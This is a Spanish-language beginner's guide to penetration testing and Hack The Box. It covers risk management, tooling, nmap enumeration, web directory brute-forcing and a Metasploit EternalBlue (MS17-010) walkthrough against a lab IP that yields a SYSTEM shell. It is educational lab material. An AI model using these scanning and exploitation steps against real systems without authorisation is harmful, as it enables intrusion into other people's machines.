### By: G.G.S | Discord: @zer0who | Github: Zer0plusOne

Este libro guiara al usuario sobre los conceptos esenciales de los pentests, incluyendo en el mismo la siguiente información:

- Visión general de la Seguridad de la Información
- Distribuciones orientadas a penetration testing
- Términos y tecnologías comunes
- Fundamentos de escaneo y enumeración
- Uso de exploits públicos
- Shells, escalada de privilegios y transferencia de archivos
- Navegación por la plataforma de Hack The Box
- Walkthrough paso a paso de una máquina retirada de HTB
- Errores comunes y cómo formular preguntas de forma efectiva
- Completar una máquina sin usar walkthroughs.
- Próximos pasos dentro del sector


## Capitulo 1: Ponerse el traje y las botas

La seguridad de la información, o comúnmente llamada en el campo como "InfoSec" viene a englobar los ámbitos siguientes dentro de sus capacidades:

- Seguridad de redes e infraestructura
- Seguridad de aplicaciones
- Pruebas de seguridad
- Auditoria de sistemas
- Planeo de continuidad del negocio
- Forense digital
- respuesta y detección a incidentes

Como cabe esperar, cada uno de estos campos tiene una cosa en común con el resto de campos y eso son los riesgos, cosa que me lleva a explicar la siguiente cosa a tener en cuenta de manera global, el **risk management** o gestión de riesgos mas comúnmente conocido.

Este proceso, suele estar dividido en 5 pasos comúnmente a lo largo del sector.

| Paso           | Explicacion                                                                                                                                                                                                                                                                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Identificación | Este paso se explica por si mismo, es el proceso que implica identificar un riesgo, ya sea posible o inminente. Esto no incluye solo riesgos en ciberseguridad, sino que se traslada a cosas como el apartado legal, de mercado, regulatorio o incluso en algunos casos al ambiental, teniendo que tener en cuenta aspectos como inundaciones y de mas. |
| Analisis       | Este paso es inminentemente posterior a la identificación.<br><br>Este consta en poder determinar el impacto y probabilidad de un riesgo identificado para poder clasificarlo por prioridades.                                                                                                                                                          |
| Evaluacion     | Con el riesgo identificado y analizado, este paso indica el proceso de evaluación final del riesgo identificado para proceder con su clasificación.                                                                                                                                                                                                     |
| Contencion     | Este paso es basicamente el principio activo, es el procedimiento a tener en cuenta y ejecutar para eliminar o contener un riesgo que haya pasado por todas las anteriores fases.                                                                                                                                                                       |
| Monitoraje     | Aun con todo lo anterior, siempre se ha de tener en cuenta que los riesgos son los que son, cosas que esperas que no ocurran pero acaban ocurriendo, por ello llevar un proceso de monitoraje puede ser clave para observar patrones, comportamientos y de mas que puedan ayudar a la prevención de una catástrofe mayor.                               |
Con todo lo anterior explicado, toca hablar de tu rol como el Pentester en este entorno.

Un **Security Assessor**, (pentester de red, de aplicaciones web, red teamer, etc.) o lo que vendría a ser como les gusta llamar a los pentesters la gente de las empresas que llevan corbata, ayuda a una organización a identificar riesgos tanto en sus redes internas como externas. Estos riesgos pueden ser vulnerabilidades técnicas, malas configuraciones, exposición de datos sensibles o fallos que, aunque no parezcan críticos a nivel técnico, pueden acabar causando un impacto reputacional serio. El trabajo de un buen pentester no es solo “romper cosas”, sino saber explicar qué riesgo existe, cómo se puede reproducir de forma controlada y qué opciones hay para mitigarlo o corregirlo, siempre alineando la parte técnica con las necesidades reales del cliente.

Las evaluaciones pueden adoptar muchas formas: desde un pentest white-box sobre todos los sistemas dentro de alcance, hasta campañas de phishing para medir la concienciación de los empleados o ejercicios de red team basados en escenarios realistas. Para evaluar correctamente las vulnerabilidades encontradas es imprescindible entender el contexto completo de la organización y su gestión del riesgo.

## Capitulo 2: Muchos zapatos, pero sirven para caminar

Hablemos de las distribuciones, cualquiera que quiera empezar un camino técnico en seguridad de la información tiene que asumir una cosa desde el principio: va a convivir con **muchos sistemas, muchas tecnologías y muchos entornos distintos**. Como pentesters no basta con saber “usar herramientas”, hay que entender cómo se montan, se mantienen y se aseguran sistemas tanto Linux como Windows. Dependiendo del alcance del proyecto, podemos acabar trabajando desde una máquina virtual Linux, una Windows, nuestro propio sistema base, una VM dentro de la infraestructura del cliente o incluso desde un equipo corporativo para simular un escenario de insider threat. Por eso, más que casarse con un sistema concreto, lo importante es sentirse cómodo moviéndose entre ellos.

Durante mucho tiempo, y como la mayoría, he pasado por distribuciones orientadas a pentesting como **Kali** o **Parrot**, que vienen cargadas de herramientas y listas para usar. Son cómodas, prácticas y tienen todo lo necesario para empezar rápido. Con el tiempo, sin embargo, te das cuenta de que no usas ni la mitad de lo que traen y que acabas repitiendo siempre las mismas herramientas. En mi caso, después de probar, romper y reinstalar muchas veces, he terminado trabajando sobre una **Debian 12 limpia**, sin ningún enfoque ofensivo por defecto. ¿Por qué? Porque al final Linux es Linux. Con tiempo suficiente, café y alguna que otra noche sin dormir, puedes convertir un **Toyota Corolla en un Lamborghini hecho a medida**. Instalas solo lo que necesitas, entiendes cada pieza que añades y sabes exactamente qué hace tu entorno y por qué.

Eso no significa que exista una distribución “mejor” que otra. Todo lo contrario. La reflexión final aquí es clara: **cada persona debería experimentar**. Probar Kali, Parrot, Ubuntu, Arch, Fedora… cambiar de entorno gráfico, usar gestores de ventanas, romper cosas y volver a montarlas. Solo así acabas encontrando tu traje a medida. La herramienta importa, sí, pero lo que realmente marca la diferencia es **sentirte cómodo con tu entorno**, entenderlo de verdad y saber adaptarlo a cada situación. El resto llega solo con práctica.

## Capitulo 3: La habitación de un adolescente

Si hay algo que da igual si estás haciendo un pentest real, un CTF, un laboratorio, un módulo formativo o simplemente jugando con máquinas de HTB, es esto: **la organización importa, y mucho**. Da igual lo bueno que seas técnicamente; si no documentas desde el principio y no sabes dónde guardas las cosas, tarde o temprano te vas a pisar a ti mismo. Y no solo en seguridad: esta es una de esas habilidades que te sirven en cualquier camino profesional.

Aquí es donde entra en juego la “habitación de un adolescente”. Todos sabemos cómo suele ser: cosas por el suelo, cajones llenos de mierda útil mezclada con basura, y la sensación constante de que algo importante está ahí… pero no sabes dónde. En pentesting pasa exactamente lo mismo si no te organizas. Tener una estructura clara de carpetas para cada proyecto, laboratorio o cliente te ahorra tiempo, errores y dolores de cabeza. Separar escaneos, evidencias, credenciales, logs, capturas y scope no es ser maniático, es ser profesional. Luego cada uno acaba ajustando la estructura a su manera: algunos separan por host, otros por red, otros lo meten todo en el gestor de notas. No hay una forma correcta, hay **la que te permita trabajar rápido y sin perder información**.

Lo mismo ocurre con las herramientas para tomar notas. No es una cuestión de cuál es “la mejor”, sino de cuál encaja contigo. Hay gente que vive feliz con algo sencillo y local, y otros que prefieren montarse una wiki personal con enlaces, cheatsheets y referencias cruzadas. Lo único realmente importante aquí es **crear una base de conocimiento propia**: comandos habituales, payloads, pasos que repites siempre, plantillas de reportes, listas de comprobación y vulnerabilidades ya redactadas. Todo lo que hoy parece obvio, mañana se olvida. Y cuanto antes empieces a documentar, antes se convierte en un hábito. Al final, una habitación puede estar desordenada… pero si sabes exactamente dónde está cada cosa, deja de ser un problema.

Para ayudar al lector, le dejo una pequeña vista explicativa de como se espera que tus proyectos se vean organizados como profesional

```shell-session
Zer0plusOne@PwnDeb[/PWN]$ tree Projects/
Projects/
└── Company Name
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

Yo tengo que decir que para cosas mas casuales como practicas y de mas, aconsejaría a cualquier persona a tener este nivel de orden, pero en caso de que no, tambien voy a decirte, con ordenarlo todo en 3 carpetas bien formateadas y listas te sirve. Tu objetivo es tenerlo todo bien ordenado para evitar perder cosas y estar buscándolas, con lo cual una clasificación simple puede salvarte horas de buscar un .txt que tenia un hash que necesitabas.

Para ello os dejo por aquí una pequeña función que podréis añadirla vuestro .bashrc o .zshrc en vuestro home para tenerlo listo.

Copiad y pegad esto en vuestro .bashrc o .zshrc .

```bash
mkt(){
	mkdir nmap exploit content # crea las carpetas para clasificar lo que encontreis
}
```

Ahora para aplicar estos cambios:

```bash
# copiad y pegad segun si usais bash o zsh como emulador de terminal
source ~/.bashrc
source ~/.zshrc
```

Y con esto tendréis un comando que especificando
```http
mkt
```

En la terminal, os creara los directorios que considero básicos para cualquier pentest, ya sea un lab o algo profesional.

## Capitulo 4: Entrar sin estar

Una **VPN (Virtual Private Network)** es, básicamente, la forma más sencilla de estar dentro de una red sin estar físicamente en ella. Nos permite conectarnos a una red privada y acceder a sus sistemas como si estuviéramos enchufados directamente al switch de la oficina. Todo esto se hace creando un **canal de comunicación cifrado** sobre una red pública como Internet. Es el mismo concepto que usa un empleado cuando se conecta desde su casa a la red corporativa de su empresa, o nosotros cuando accedemos a un laboratorio privado de pentesting.

A alto nivel, cuando usamos una VPN, **nuestro tráfico deja de salir directamente a través de nuestro proveedor de Internet** y pasa primero por el servidor VPN. Desde fuera, parece que el tráfico se origina en ese servidor y no en nuestra máquina. Esto añade una capa de privacidad y seguridad, ya que el contenido del tráfico va cifrado y no puede ser espiado fácilmente mientras atraviesa redes públicas.

### Tipos de VPN (las más habituales)

En entornos reales nos encontraremos principalmente con dos tipos de VPN de acceso remoto:

- **VPN basada en cliente**  
    Requiere instalar un software específico (por ejemplo, OpenVPN). Una vez conectados, nuestro equipo se comporta casi como si estuviera dentro de la red interna: podemos acceder a hosts, subredes y servicios según lo que permita la configuración. En algunos casos se nos da acceso completo; en otros, solo a un segmento concreto reservado para usuarios remotos.
- **VPN SSL (desde el navegador)**  
    Funciona directamente desde el navegador web. Suele limitarse a aplicaciones concretas como correo o intranet, aunque en algunos casos permite acceso más amplio. Es cómoda porque no requiere instalar nada, pero también suele ser más restrictiva.

### ¿Por qué usar una VPN?

Fuera del pentesting, mucha gente usa servicios comerciales de VPN para **ocultar su IP pública** o saltarse restricciones de red. Esto puede ser útil, pero conviene tener claro algo: **una VPN no garantiza anonimato absoluto**. Siempre hay que confiar en el proveedor, y confiar ciegamente nunca es buena idea. Una VPN puede protegerte en redes hostiles (como un WiFi público de aeropuerto), pero no te libra de las consecuencias de hacer cosas que no deberías hacer.

En seguridad ofensiva, la VPN tiene otro papel: **es el puente de entrada a redes privadas** a las que no podríamos acceder de ninguna otra forma.

### ¿Cómo sabemos que estamos conectados?

Una vez conectados, aparecerá una nueva interfaz de red, normalmente llamada `tun0`:
```js
ifconfig
```

Ver algo como esto indica que la VPN está activa:

```js
tun0: flags=4305<UP,POINTOPOINT,RUNNING> inet 10.10.x.2
```

Si queremos ver **qué redes ahora son accesibles a través de la VPN**, podemos usar:

```js
netstat -rn
```

Ahí veremos que ciertas redes privadas (por ejemplo, las de HTB Academy) se enrutan a través de `tun0`. En otras palabras: ahora podemos alcanzar sistemas que antes no existían para nosotros.

### Una última advertencia importante

Cuando te conectas a una VPN de laboratorio o de pentesting, **compórtate como si estuvieras en terreno enemigo**. No reutilices VMs de clientes reales, no dejes credenciales guardadas, no expongas servicios innecesarios y bloquea todo lo que no uses. La VPN es una puerta de entrada, sí, pero también puede ser una puerta de salida si no tienes cuidado.

Entrar sin estar es una gran ventaja.  
Saber **cuándo y cómo hacerlo sin liarla**, es lo que marca la diferencia.

## Capitulo 5: La lengua franca del pentesting

El penetration testing y la seguridad ofensiva son campos enormes. A lo largo del camino vamos a cruzarnos con **muchísimas tecnologías, conceptos y términos** que se repiten una y otra vez. No es una lista cerrada ni definitiva, pero hay ciertas palabras que hay que entender bien desde el principio si no queremos sentir que todo el mundo habla un idioma distinto al nuestro.

Este capítulo no pretende que memorices todo, sino que empieces a **reconocer patrones**. Cuando entiendes qué significa algo, deja de sonar raro y empieza a tener sentido dentro del contexto.

### ¿Qué es una shell?

La palabra _shell_ aparece constantemente, y no siempre significa exactamente lo mismo. En sistemas Linux, una shell es el programa que recibe los comandos que escribimos y se los pasa al sistema operativo para que los ejecute. Durante muchos años fue la **única forma de interactuar con un ordenador**, mucho antes de que existieran interfaces gráficas.

Hoy en día convivimos con ambos mundos:

- terminales en Linux
- `cmd.exe` o PowerShell en Windows
- interfaces gráficas que se apoyan en todo lo anterior

En Linux, la shell más común es **Bash**, aunque existen muchas otras como Zsh, Fish o Ksh. Pero en pentesting, cuando alguien dice _“he conseguido una shell”_, no está hablando de Bash como tal, sino de algo mucho más importante: **acceso al sistema**.

Conseguir una shell significa que el sistema objetivo ha sido explotado y que ahora podemos ejecutar comandos en él como si estuviéramos sentados delante de la máquina.

### Tipos de shell más comunes

| Tipo de shell     | Qué significa                                                                  |
| ----------------- | ------------------------------------------------------------------------------ |
| **Reverse shell** | El sistema víctima inicia la conexión hacia nuestra máquina                    |
| **Bind shell**    | El sistema víctima abre un puerto y espera que nos conectemos                  |
| **Web shell**     | Ejecuta comandos a través de una aplicación web, normalmente de forma limitada |

Cada tipo tiene su contexto y utilidad, y pueden implementarse en prácticamente cualquier lenguaje: Bash, Python, PHP, Perl, Go…  
La shell es una herramienta, no un fin. Lo importante es **qué puedes hacer con ella**.

### ¿Qué es un puerto?

Un puerto se puede entender como una **puerta o ventana** de un sistema. El sistema es la casa, y los servicios que ofrece están detrás de esas puertas. Si una puerta está abierta o mal cerrada, puede convertirse en un punto de entrada.

Los puertos son gestionados por el sistema operativo y están asociados a servicios concretos. Gracias a ellos, un sistema sabe si el tráfico que llega es para una web, para SSH, para correo o para cualquier otra cosa.

Existen dos grandes tipos:

- **TCP**: orientado a conexión, más fiable (Todo va super seguro pero es muy lento)
- **UDP**: sin conexión, más rápido pero menos fiable (Como una carretera alemana, sin limites pero si te estampas te estampas)


Cada uno tiene hasta **65.535 puertos**, y muchos de ellos están asociados tradicionalmente a servicios concretos.
### Puertos que deberías reconocer sin pensar

| Puerto | Servicio | Nombre del protocolo                                   |
| ------ | -------- | ------------------------------------------------------ |
| 21     | FTP      | File Transfer Protocol                                 |
| 22     | SSH      | Secure Shell                                           |
| 25     | SMTP     | Simple Mail Transfer Protocol                          |
| 80     | HTTP     | HyperText Transfer Protocol                            |
| 443    | HTTPS    | HyperText Transfer Protocol Secure                     |
| 445    | SMB      | Server Message Block                                   |
| 3389   | RDP      | Remote Desktop Protocol                                |
| 389    | LDAP     | Lightweight Directory Access Protocol                  |
| 161    | SNMP     | Simple Network Management Protocol                     |
### ¿Qué es un servidor web?

Un servidor web es el componente que recibe peticiones HTTP desde el navegador y devuelve respuestas: páginas, datos, errores, lo que toque. Normalmente escuchan en los puertos **80 o 443**, y suelen ser la parte más expuesta de una infraestructura.

Precisamente por eso, las aplicaciones web son uno de los objetivos favoritos:

- están expuestas a Internet
- aceptan entradas del usuario
- suelen estar conectadas a bases de datos y otros sistemas internos

Una sola vulnerabilidad en una web puede abrir la puerta al servidor completo.

### OWASP Top 10: el mapa base

Cuando se habla de seguridad web, tarde o temprano aparece el **OWASP Top 10**. No es una lista de “las únicas vulnerabilidades que existen”, sino de **las más críticas y comunes**.

Algunos ejemplos clave:

- controles de acceso mal implementados
- inyecciones (SQL, comandos, LDAP…)
- componentes desactualizados
- configuraciones inseguras
- fallos de autenticación
- falta de logging y monitorización

Conocer estas categorías no te hace experto, pero **te da un marco mental** para saber qué buscar y por qué.

### Idea clave

Todo esto puede sonar a jerga al principio, pero no lo es.  
Es simplemente **el idioma del oficio**.  
Cuanto antes empieces a entenderlo, antes dejarás de traducir mentalmente y empezarás a pensar directamente en términos de ataque, defensa y contexto.

## Capitulo 6: La caja de herramientas

En seguridad ofensiva hay herramientas “de pentesting” y luego están **las herramientas que usas todos los días**, quieras o no. SSH, Netcat, tmux y Vim no están pensadas para atacar, pero sin dominarlas vas cojo. Da igual lo bueno que seas explotando vulnerabilidades: si no sabes moverte con soltura por un sistema, tu rendimiento se hunde.

Estas herramientas son transversales. Las vas a usar haciendo CTFs, laboratorios, pentests reales y también administrando sistemas. Por eso conviene aprenderlas bien desde el principio.

### SSH: acceso remoto de verdad

**SSH (Secure Shell)** es el protocolo estándar para acceder de forma remota a sistemas Linux (y muchos otros) y suele escuchar en el **puerto 22**. Permite autenticarse con contraseña o, lo más habitual en entornos profesionales, mediante **claves públicas/privadas**.

En un pentest, SSH es oro. Muchas veces conseguimos:

- credenciales en texto claro
- una clave privada
- o la posibilidad de añadir nuestra clave pública

Con eso podemos conectarnos directamente al sistema objetivo:

```rust
ssh usuario@192.168.0.1
```

Una sesión SSH suele ser **mucho más estable que una reverse shell**, y además nos permite:

- usar el sistema como _jump host_
- pivotar hacia otras redes
- transferir herramientas
- establecer persistencia

Cuando puedes usar SSH, casi siempre es mejor opción que una shell improvisada.

### Netcat: el cuchillo suizo

**Netcat (nc)** es una herramienta brutalmente simple y brutalmente útil. Sirve para interactuar con **puertos TCP y UDP**, y en pentesting se usa para mil cosas.

Un uso clásico es el **banner grabbing**. Si conectamos a un puerto con netcat:
```rust
nc 10.10.10.10 22
```

y recibimos algo como:

```http
SSH-2.0-OpenSSH_X.Xpx Debian
```

ya sabemos qué servicio corre ahí y hasta su versión aproximada.

Netcat también se usa para:

- recibir reverse shells
- enviar comandos
- transferir archivos
- probar servicios manualmente

Existen alternativas más potentes como **socat**, que permite cosas como:

- redirección de puertos
- mejora de shells a TTY interactivo
- conexiones más complejas

Si puedes llevarte un binario contigo, socat suele ser una mejora clara.

### Tmux: no volver a perder una shell

Un **multiplexor de terminal** como **tmux** te permite tener varias ventanas y paneles dentro de una sola terminal. Cuando empiezas a usarlo bien, no hay vuelta atrás.

Instalarlo es trivial:

`sudo apt install tmux -y`

Una vez dentro:

- `CTRL + B` es el prefijo
- `CTRL + B` + `C` → nueva ventana
- `CTRL + B` + `%` → dividir vertical
- `CTRL + B` + `"` → dividir horizontal
- `CTRL + B` + flechas → moverte entre paneles

Tmux es especialmente útil para:

- no perder sesiones
- mantener listeners activos
- trabajar con varios hosts a la vez
- **registrar todo lo que haces**, algo clave en entornos profesionales

### Vim: editar sin ratón y sin excusas

**Vim** es uno de esos editores que o lo odias o no puedes vivir sin él. La realidad es que **siempre está ahí**: en servidores comprometidos, en máquinas minimalistas y en entornos donde no hay nada más.

Abrir un archivo:
```bash
vim /etc/hosts
```

Al abrirlo estás en **modo normal** (solo navegación).  
Para editar, pulsa `i` y entras en **modo inserción**.  
Para volver atrás, `ESC`.

Comandos básicos que conviene memorizar:

|Comando|Acción|
|---|---|
|x|borrar carácter|
|dw|borrar palabra|
|dd|borrar línea|
|yw|copiar palabra|
|yy|copiar línea|
|p|pegar|

Guardar y salir:

- `:w` → guardar
- `:q` → salir
- `:wq` → guardar y salir
- `:q!` → salir sin guardar

Vim no es solo un editor: es una herramienta de supervivencia. Saber usarlo te permite modificar archivos de configuración, scripts y datos incluso en los entornos más limitados.

### Idea clave

Estas herramientas no son “opcionalmente útiles”.  
Son **la base**.

Puedes saber explotar la vulnerabilidad más compleja del mundo, pero si no sabes:

- mantener una sesión estable
- organizarte en la terminal
- editar archivos rápido
- moverte entre sistemas

vas a ir siempre un paso por detrás.  
Dominar lo básico es lo que te permite que lo avanzado funcione.

## Capitulo 7: El santo grial del Pentester

Cuando por fin tenemos una IP delante, empieza el juego de verdad. Antes de explotar nada, antes incluso de pensar en vulnerabilidades, hay una pregunta obligatoria:  
**¿qué hay ahí delante y cómo habla conmigo?**

Un sistema no es más que una máquina con una dirección IP y una serie de **servicios escuchando en puertos**. Esos servicios están pensados para hacer su trabajo normal… pero a nosotros nos interesa cuando están mal configurados, desactualizados o simplemente mal pensados. Ahí es donde intentamos que hagan algo que **no deberían hacer**, como ejecutar comandos o soltar información sensible.

Escanear servicios a mano, probando uno a uno los 65.535 puertos, sería una locura. Por eso existe **Nmap**. Y por eso es, sin exagerar, una de las herramientas más importantes de todo el pentesting.

### Nmap: ver sin tocar (demasiado)

El uso más básico de Nmap es casi insultantemente simple:

`nmap 10.129.42.253`

Con eso, Nmap escanea los **1.000 puertos más comunes** y nos dice cuáles están abiertos. En segundos ya sabemos si hay FTP, SSH, web, SMB… y eso ya nos da pistas enormes sobre el sistema.

Ejemplo típico de salida:

- FTP en 21
- SSH en 22
- HTTP en 80
- SMB en 139/445

Solo con eso ya empezamos a hacernos una idea del objetivo. Y con el tiempo, casi sin pensarlo, asocias ciertos puertos a ciertos sistemas. RDP en 3389 suele gritar _Windows_. SSH suele oler a _Linux._ No es infalible, pero orienta.

### Escanear bien cuesta tiempo (y merece la pena)

Cuando queremos ir en serio, Nmap también sabe profundizar. El combo clásico es:

```bash
nmap -sC -sV -p- $IP
```

Esto hace varias cosas importantes:

- `-p-` → escanea **todos los puertos**
- `-sV` → detecta **versiones de servicios**
- `-sC` → ejecuta **scripts por defecto** para sacar información extra

Aquí ya no solo vemos _qué_ servicio hay, sino **qué versión exacta**, banners, configuraciones débiles, autenticaciones anónimas, headers web, etc.

Sí, tarda más.  
Pero también es cuando empiezan a aparecer regalos.

Como consejo de alguien que ha estado practicando bastante tiempo, suelo ejecutar el siguiente combo:

```bash
# Primer comando, listamos los puertos disponibles en el objetivo y lo guardamos en un .txt para mas tarde

nmap -sS -p- --min-rate X $IP_Objetivo -oN first_scan.txt -vvv
```

Una vez tenemos esto, necesitamos extraer los puertos exactos que hemos listado que tienen un servicio disponible que nosotros podamos llegar a explotar

Para ello, os dejo un script simple en python donde simplemente lo ejecutaremos con:

```bash
python3 script.py -t first_scan.txt # o en su defecto, el nombre que hayamos especificado
```

Aqui os dejo el script:

```python
#!/usr/bin/env python3

import argparse
import re

def extract_ports(filename):
    ports = []

    with open(filename, "r") as f:
        for line in f:
            # Coincide con líneas tipo: 22/tcp open ssh
            match = re.match(r"^(\d+)/\w+\s+open", line)
            if match:
                ports.append(match.group(1))

    return ports

def main():
    parser = argparse.ArgumentParser(
        description="Extract open ports from an Nmap -oN output file"
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Nmap output file (normal format, -oN)"
    )

    args = parser.parse_args()

    ports = extract_ports(args.target)

    if not ports:
        print("[-] No open ports found.")
        return

    print("[+] Open ports found:")
    print(", ".join(ports))

    print("\n[+] Ready-to-use Nmap format:")
    print(f"-p{','.join(ports)}")

if __name__ == "__main__":
    main()
```

Esto os dara como salida lo siguiente:
```bash
[+] Open ports found:
21, 22, 80, 139, 445

[+] Ready-to-use Nmap format:
-p21,22,80,139,445
```

Ahora con esto, ya puedes ejecutar lo siguiente:

```bash
nmap -sC -sV --min-rate x -p21,22,80,139,445 $IP_Objetivo -oN Serv_Enum.txt -vvv
```

### Banner grabbing: hablar el idioma del servicio

Muchos servicios se delatan solos. Al conectarte, **se presentan**. Eso es banner grabbing.

Puedes hacerlo con Nmap… o a mano con Netcat:
```js
nc -nv 127.0.0.1 21
```

Si el servidor responde con:

`220 (vsFTPd 3.0.3)`

ya sabes exactamente qué hay ahí. Y ahora la pregunta cambia de _qué hay_ a _qué le duela_.

### FTP: el clásico que nunca muere

FTP sigue apareciendo más de lo que debería.  
Y cuando aparece con **login anónimo**, hay que mirar sí o sí.

Conectar es trivial:

```js
ftp 127.0.0.1
```

Y de ahí:

- listar directorios
- descargar archivos
- encontrar credenciales olvidadas

Muchas veces, un simple `login.txt` es suficiente para avanzar toda la máquina.

### SMB: lateralidad en potencia

SMB es uno de los servicios más jugosos, sobre todo en entornos Windows.  
Puede dar:

- shares con información sensible
- credenciales reutilizables
- vectores de movimiento lateral
- incluso RCEs históricos como EternalBlue

Enumerar shares con `smbclient` suele ser obligatorio:

```js
smbclient -L \\127.0.0.1 -N
```

Y si hay credenciales… probarlas. Siempre.

### SNMP: el gran olvidado

SNMP es otro de esos servicios que cuando está mal configurado **habla demasiado**.  
Si alguien dejó la community string por defecto (`public` o `private`), puedes sacar:

- nombre del host
- versión del kernel
- procesos
- rutas
- interfaces

Con herramientas como `snmpwalk` u `onesixtyone`, SNMP puede convertirse en un atajo brutal.

## Capitulo 8: El escaparate y el almacén

Cuando escaneamos servicios, casi siempre acabamos topándonos con servidores web escuchando en los puertos **80 o 443**. Y aquí es donde muchos se relajan… error.  
Las aplicaciones web suelen ser **uno de los mayores vectores de ataque** en un pentest. No solo porque están expuestas, sino porque detrás suele haber **lógica, ficheros, rutas ocultas y errores humanos**.

Una web no es solo lo que ves en el navegador. Es lo que **no** ves.

### Enumeración de directorios y ficheros

Lo primero que suelo hacer cuando encuentro una web es preguntarme:

> _¿Qué hay aquí que no debería ver?_

Para eso usamos herramientas como **Gobuster** o **ffuf**, que nos permiten descubrir directorios y archivos ocultos mediante fuerza bruta.

Ejemplo básico con Gobuster:
```http
gobuster dir -u http://127.0.0.1/ \ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```

Aquí no buscamos magia, buscamos **errores**:

- rutas olvidadas
- paneles de administración
- instalaciones a medio hacer
- backups
- configuraciones expuestas

En el ejemplo, aparece `/wordpress`.  
Y WordPress, como ya sabes, **es una fiesta** si está mal configurado o sin terminar.

### Subdominios: el patio trasero

Muchas veces lo interesante no está en la web principal, sino en **subdominios**:

- `admin.`
- `dev.`
- `test.`
- `blog.`
- `internal.`

Con Gobuster también podemos enumerarlos:

```http
gobuster dns -d hackmyweb.com \ -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

Los subdominios suelen alojar:

- paneles internos
- entornos de pruebas
- aplicaciones olvidadas
- servicios sin hardening

Y suelen ser **mucho más débiles** que la web principal.

### Banner grabbing y cabeceras HTTP

Antes de tocar nada serio, conviene saber **qué hay detrás**.  
Las cabeceras HTTP muchas veces hablan más de lo que deberían.

```bash
curl -IL https://www.hackmyweb.com
```

Aquí podemos descubrir:

- servidor web
- framework
- APIs expuestas
- versiones
- configuraciones débiles

Toda esta información sirve para **reducir el campo de búsqueda** y enfocar ataques.

### Identificación de tecnologías

Para no hacerlo todo a mano, herramientas como **whatweb** ayudan muchísimo:

```c
whatweb 127.0.0.1
```

O incluso contra rangos enteros:

```c
whatweb --no-errors 127.0.0.0/24
```

Con esto obtenemos:

- servidor web
- lenguaje
- frameworks
- CMS
- librerías
- versiones

No es explotación, es **contexto**. Y sin contexto, vas a ciegas.

### Certificados SSL: información gratis

Si la web usa HTTPS, el certificado puede revelar:

- nombres de empresa
- emails
- ubicaciones
- dominios relacionados

Todo esto puede ser útil más adelante, especialmente si el scope permite **ingeniería social**.

### robots.txt: el clásico que sigue funcionando

Nunca te saltes esto:

```c
/robots.txt
```

Aunque su función sea guiar a buscadores, muchas veces señala justo lo que **no quieren que veas**:

- `/admin`
- `/private`
- `/uploads`

Y sí, sigue funcionando en 2025.

### Código fuente: el enemigo es humano

Último paso, pero no menos importante:  
**ver el código fuente**.

Un simple `CTRL + U` puede revelar:

- comentarios de desarrolladores
- rutas internas
- tokens
- credenciales de pruebas

Porque al final, la mayoría de fallos no son técnicos, son humanos.


## Capitulo 9: No reinventes la bomba

Una vez hemos identificado los servicios que corren en la máquina (gracias a Nmap y una enumeración decente), el siguiente paso lógico **no es escribir exploits desde cero**, sino comprobar si alguien ya hizo ese trabajo antes que nosotros.

En pentesting real, y también en HTB, la mayoría de accesos iniciales vienen de **vulnerabilidades conocidas**: servicios mal configurados, versiones antiguas o software con fallos públicos. Nuestro trabajo aquí no es ser genios, sino ser eficientes.

## Buscando exploits públicos

Lo primero, lo más simple, y muchas veces lo más efectivo: **buscar en Google**.  
Algo tan básico como:

> `OpenSSH 7.2 exploit`  
> `Windows 7 SMB exploit`

ya puede darnos pistas claras de por dónde van los tiros.

A partir de ahí, entramos en herramientas más pensadas para el día a día.

## Searchsploit: no dispares a ciegas

Searchsploit nos permite buscar exploits públicos directamente desde nuestra máquina, usando la base de datos de Exploit-DB.

Instalación (si no lo tenemos):
```bash
sudo apt install exploitdb -y
```

Ejemplo de búsqueda:
```js
searchsploit openssh 7.2
```

Esto nos devuelve una lista de exploits conocidos asociados a esa versión o rango de versiones.  
Aquí **no se trata de ejecutar lo primero que veas**, sino de:

- Leer el título del exploit
- Ver si es remoto o local
- Entender si requiere autenticación
- Comprobar si es DoS, enumeración o RCE

Muchos “exploits” no te van a dar acceso, pero **sí información útil**.

## Metasploit: el martillo no es el problema

Metasploit no es magia. Es un framework.  
Bien usado, es una herramienta brutal. Mal usado, te convierte en alguien que no sabe qué está pasando.

Metasploit nos permite:

- Enumerar servicios
- Verificar vulnerabilidades sin explotarlas
- Explotar de forma controlada
- Gestionar sesiones y post-explotación

Se lanza con:

```js
msfconsole
```

## Buscando un exploit dentro de Metasploit

Siguiendo el ejemplo clásico de SMB:

```js
msf6 > search exploit eternalblue
```

Aquí encontramos módulos relacionados con **MS17-010**.  
Elegimos uno y lo cargamos:

```js
msf6 > use exploit/windows/smb/ms17_010_psexec
```

Antes de ejecutar nada, **siempre**:

```js
show options
```

Todo lo que aparezca como `Required: yes` hay que configurarlo.  
En este caso, lo mínimo suele ser:

- `RHOSTS` → IP del objetivo
- `LHOST` → nuestra IP o interfaz (por ejemplo `tun0`

```js
set RHOSTS 10.10.10.40 set LHOST tun0
```

## Primero comprobar, luego explotar

Si el módulo lo permite, **usa `check`**:

```js
check
```

Esto nos dice si el objetivo **parece vulnerable**, sin tocarlo todavía.  
No todos los módulos lo soportan, pero cuando está disponible, úsalo.

## Explotación controlada

Si todo tiene sentido, entonces sí:

```http
exploit
```

En este ejemplo, el resultado es una sesión **SYSTEM** en una máquina Windows 7 vulnerable, y acceso interactivo a la shell.

Esto no es suerte.  
Es el resultado de **enumerar bien**, buscar exploits con cabeza y entender qué estás lanzando.

## Capitulo 10: Todo para que me hables

Una vez comprometemos un sistema y conseguimos ejecutar comandos de forma remota, hay un problema evidente: no es viable explotar la misma vulnerabilidad una y otra vez cada vez que queremos lanzar un comando. Para poder enumerar el sistema con calma, movernos por él o dar el siguiente paso dentro de la red, necesitamos algo más estable: **una forma de “hablar” directamente con el sistema**. Ahí es donde entran los _shells_.

